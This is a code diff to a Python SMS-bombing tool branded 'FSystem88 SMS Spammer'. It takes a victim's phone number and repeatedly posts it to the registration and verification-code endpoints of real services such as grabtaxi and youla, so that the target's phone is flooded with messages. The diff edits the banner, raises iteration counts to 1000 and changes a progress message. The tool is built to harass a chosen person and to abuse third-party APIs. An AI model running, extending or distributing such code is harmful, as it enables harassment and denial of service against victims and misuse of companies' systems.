@@ -5,7 +5,7 @@ class spymer:
 	def main(self):
 		import requests, random, datetime, sys, time, argparse
 		from colorama import Fore, Back, Style
-		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.5.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
+		print(Fore.GREEN + '88888lolkor88888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.5.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
 		print(Style.RESET_ALL)
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
@@ -45,7 +45,7 @@ class spymer:
 		_name = ''
 		for x in range(12):
 			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
-		iteration = 10			
+		iteration = 1000			
 		_phone9 = _phone[1:]
 		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
 		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
@@ -55,7 +55,7 @@ class spymer:
 		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
 		print('Спамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
 		i = 1
-		iteration = 0
+		iteration = 1000
 		while i < 10:
 			_email = _name+f'{iteration}'+'@gmail.com'
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'})
@@ -71,7 +71,7 @@ class spymer:
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
 			
 			iteration += 50
-			print(('{} круг пройден.').format(iteration))
+			print(('{} чпуньк.').format(iteration))
 
 spammer = spymer()
 spammer.main()
